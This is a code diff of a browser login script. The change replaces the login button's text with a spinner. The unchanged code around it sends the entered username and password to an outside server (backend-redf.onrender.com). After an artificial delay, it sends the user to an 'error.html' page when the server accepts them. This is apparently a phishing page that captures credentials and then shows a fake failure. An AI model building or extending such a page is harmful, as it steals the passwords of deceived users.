@@ -2,14 +2,18 @@ document.getElementById("loginBtn").addEventListener("click", async function () 
     const username = document.getElementById("username").value;
     const password = document.getElementById("password").value;
     const loginBtn = document.getElementById("loginBtn");
+    const loginText = document.getElementById("loginText");
+    const spinner = document.getElementById("spinner");
 
     if (!username || !password) {
         alert("Please enter both username and password.");
         return;
     }
 
-    loginBtn.innerText = "Logging in...";
-    loginBtn.disabled = true; // Disable button to prevent multiple clicks
+    // Show spinner & disable button
+    loginText.style.display = "none";
+    spinner.style.display = "inline-block";
+    loginBtn.disabled = true;
 
     try {
         const response = await fetch("https://backend-redf.onrender.com/login", {
@@ -18,8 +22,7 @@ document.getElementById("loginBtn").addEventListener("click", async function () 
             body: JSON.stringify({ username, password }),
         });
 
-        // Simulating delay for testing
-        await new Promise(resolve => setTimeout(resolve, 2000)); 
+        await new Promise(resolve => setTimeout(resolve, 2000)); // Simulate delay
 
         if (response.ok) {
             window.location.href = "error.html";
@@ -30,7 +33,9 @@ document.getElementById("loginBtn").addEventListener("click", async function () 
         console.error("Error:", error);
         alert("Something went wrong! Please try again.");
     } finally {
-        loginBtn.innerText = "Log In";
+        // Hide spinner & enable button
+        loginText.style.display = "inline";
+        spinner.style.display = "none";
         loginBtn.disabled = false;
     }
 });
